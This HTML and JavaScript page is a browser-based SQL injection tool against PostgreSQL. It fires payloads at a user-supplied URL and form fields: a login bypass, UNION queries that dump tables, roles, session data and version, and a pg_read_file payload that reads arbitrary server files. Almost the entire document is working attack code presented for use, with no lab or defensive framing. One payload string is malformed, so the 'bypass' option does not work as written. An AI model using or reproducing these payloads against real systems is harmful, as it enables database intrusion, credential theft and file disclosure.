<html lang="en"> 
    <head> 
        <meta charset="UTF-8"> 
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>
        </title>
    </head>
    <body>
        <div style="display:flex;">
            <div style="width:50%">
                <div>
                    <label style="width:100%;margin-block:4px;padding:4px" for="">URL</label>
                    <input style="width:100%;margin-block:4px;padding:4px" type="text" id="formurl">
                </div>
                <div>
                    <label style="width:100%;margin-block:4px;padding:4px" for="">FORM METHOD</label>
                    <select style="width:100%;margin-block:4px;padding:4px" id="formmethod">
                        <option value="get">get</option>
                        <option value="post">post</option>
                    </select>
                </div>
                <div>
                    <label style="width:100%;margin-block:4px;padding:4px" for="">FORM FIELDS</label>
                    <input style="width:100%;margin-block:4px;padding:4px" type="text" id="formparams">
                </div>
                <div>
                    <label style="width:100%;margin-block:4px;padding:4px" for="">DUMP FILE</label>
                    <input style="width:100%;margin-block:4px;padding:4px" type="text" id="formdumpfile">
                </div>
                <div style="display:flex">
                    <label for="union_test"><input name="test" checked type="radio" value="crash_test" style="margin-inline:2px">detection</label>
                </div>
                <div style="display:flex">
                    <label for="union_test"><input name="test" type="radio" value="injection_test" style="margin-inline:2px">bypass</label>
                </div>
                <div style="display:flex">
                    <label for="union_test"><input name="test" type="radio" value="union_test" style="margin-inline:2px">test union</label>
                </div>
                <div style="display:flex">
                    <label for="union_test"><input name="test" type="radio" value="union_dump_tables" style="margin-inline:2px">dump tables</label>
                </div>
                <div style="display:flex">
                    <label for="union_test"><input name="test" type="radio" value="union_dump_current" style="margin-inline:2px">dump current</label>
                </div>
                <div style="display:flex">
                    <label for="union_test"><input name="test" type="radio" value="union_dump_users" style="margin-inline:2px">dump users</label>
                </div>
                <div style="display:flex">
                    <label for="union_test"><input name="test" type="radio" value="union_dump_session" style="margin-inline:2px">dump session</label>
                </div>
                <div style="display:flex">
                    <label for="union_test"><input name="test" type="radio" value="union_dump_file" style="margin-inline:2px">dump file</label>
                </div>
                <div>
                    <button onclick='sqli()' style="width:100%;margin-block:4px;padding:4px">TEST</button>
                </div>
            </div>
            <div style="width:50%;overflow:scroll; padding:22px" id="render">
                <pre>
                </pre>
            </div>
        </div>
        <script> 
            const tests = {
                crash_test: `', injection_test:' or '1'='1' -- `,
                union_test: `x' OR '1'='0' UNION SELECT 1, version(), current_user, current_database() -- `,
                union_dump_current: `x' OR '1'='0' UNION SELECT 1, version(), current_user, current_database() -- `,
                union_dump_tables: `x' OR '1'='0' union select 1,table_name,table_schema,table_catalog from information_schema.tables where table_schema='public' order by 4 -- `,
                union_dump_users: `x' OR '1'='0' union select 1,rolname,rolsuper::text,rolcanlogin::text FROM pg_roles -- `,
                union_dump_session: `x' OR '1'='0' union select 1,current_user,current_setting('server_version'),session_user -- `,
                union_dump_file: (filename) => `x' OR '1'='0' union select 1, pg_read_file('${filename}'), null, null -- `,
            }
            const post = (req, data, cb) => {
                data = formdata(data) 
                req.onload = cb 
                req.send(data)
            }
            const get = (req, cb) => {
                req.onload = cb
                req.send()
            }
            const formdata = (data) => {
                let _formData = new FormData()
                Object.keys(data).map(key => {
                    _formData.append(key, data[key])
                })
                return _formData
            }
            const formparams = (data) => {
                let _formData = ""
                Object.keys(data).map(
                    (key, idx) => {
                        _formData += (idx > 0) ? "&" : "?"
                        _formData += `${key}=${data[key]}`
                    }
                )
                return _formData
            }
            const custom_req = (url) => {
                let _req = new XMLHttpRequest()
                return {
                    post: (data, cb) => {
                        _req.open('POST', url)
                        post(_req, data, cb)
                    },
                    get: (data, cb) => {
                        _req.open('GET', url + formparams(data))
                        get(_req, cb)
                    },
                    req: _req
                }
            }

            function elem(selector) 
            {
                return document.querySelector(selector)
            }

            function elems(selector) 
            {
                return document.querySelectorAll(selector)
            }

            function sqli() 
            {
                const url = elem("#formurl").value ?? null
                const method = elem("#formmethod").value ?? null
                let params = elem("#formparams").value ?? null
                let filename = elem("#formdumpfile").value ?? null
                let optional_key = elem('[name=test]:checked').value
                const optionals = {}
                if (optional_key) 
                    {
                    optionals[optional_key] = true
                }
                if (params) 
                {
                    params = params.split(',')
                }
                if (filename) 
                {
                    params.push('filename=' + filename)
                }
                console.info(params, 'are params')
                injection(url, params, method, optionals)
            }

            function injection(url, params, method, optionals) 
            {
                if (url && method && params && (params.length)) 
                {
                    params = make_params(params, optionals) 
                    const req = custom_req(url) 
                    req[method](params, res => {
                        elem("#render").innerHTML = req.req.response
                    })
                }
            }

            function make_params(params, optionals = {}) 
            {
                const parameters = {}
                params.map(param => {
                    let param_arr = [param, '']
                    if (param.match('=')) 
                    {
                        param_arr = param.split('=')
                    } 
                    else 
                    {
                        param_arr[1] = 'test'
                    }
                    let param_name = param_arr[0]
                    let param_val = param_arr[1] 
                    parameters[param_name] = param_val
                }) 
                if (optionals && Object.keys(parameters).length) 
                {
                    let param_index = 0
                    if (!isNaN(optionals.param_index)) 
                    {
                        param_index = optionals.param_index
                    }
                    parameters[Object.keys(parameters)[param_index]] = ''
                    if (optionals.union_dump_file) 
                    {
                        parameters[Object.keys(parameters)[param_index]] += tests.union_dump_file(parameters.filename)
                    } 
                    else 
                    {
                        if (optionals.injection_test) 
                        {
                            parameters[Object.keys(parameters)[param_index]] += tests.injection_test
                        }
                        if (optionals.union_test) 
                        {
                            parameters[Object.keys(parameters)[param_index]] += tests.union_test
                        }
                        if (optionals.union_dump_tables) 
                        {
                            parameters[Object.keys(parameters)[param_index]] += tests.union_dump_tables
                        }
                        if (optionals.union_dump_current) 
                        {
                            parameters[Object.keys(parameters)[param_index]] += tests.union_dump_current
                        }
                        if (optionals.union_dump_users) 
                        {
                            parameters[Object.keys(parameters)[param_index]] += tests.union_dump_users
                        }
                        if (optionals.union_dump_session) 
                        {
                            parameters[Object.keys(parameters)[param_index]] += tests.union_dump_session
                        }
                    }
                }
                return parameters
            }
            </script>
    </body>
</html>